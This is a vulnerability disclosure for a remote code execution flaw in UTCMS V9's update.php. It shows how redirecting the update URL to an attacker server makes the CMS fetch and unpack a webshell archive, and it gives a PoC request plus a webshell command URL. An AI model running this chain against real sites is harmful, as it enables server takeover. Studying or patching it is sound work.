# Vendor

HuangDou

# Product

UTCMS

# version

 V9

# Download 

https://github.com/usualtool/ut-cms

# Vulnerability

RCE

# Description

In the update.php page, users can remotely downloading the compressed package and automatically decompressing it and RCE.

# Analysis

In the app/modules/ut-frame/admin/update.php , users can remotely downloading the compressed package and automatically decompressing it and RCE. We can upload a zip compressed package on the remote server, which contains a webshell file.
example：http://xxx.com/xxx.zip
http://192.168.1.69/webshell.zip

Then we modify the system configuration and change the UPDATEURL to our remote server, such as http://192.168.1.69
<img width="1993" height="1282" alt="image" src="https://github.com/user-attachments/assets/0b50b592-a054-42ff-b6dc-caf09495d618" />

Then we construct the request:
<img width="505" height="354" alt="image" src="https://github.com/user-attachments/assets/d88f15c8-f48a-40a9-88e1-9ec8077e5729" />

You can see that webshell.zip was successfully downloaded and webshell.php was generated
<img width="683" height="222" alt="image" src="https://github.com/user-attachments/assets/e32bcf2c-9de0-4fce-90d8-d7de0d6c1443" />

We access the webshell to execute the command:
http://192.168.1.69/ut-cms-9/update/webshell.php?cmd=id
<img width="1028" height="293" alt="image" src="https://github.com/user-attachments/assets/4d4e577a-b9c6-47d2-a812-0eb28f121702" />


# POC
```
GET /ut-cms-9/app/dev/?p=update&i=webshell&t=update HTTP/1.1
Host: 192.168.1.69
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=l7s63btrio4o1cepgib2l9v89m

request：
http://192.168.1.69/ut-cms-9/update/webshell.php?cmd=id
```
webshell RCE:

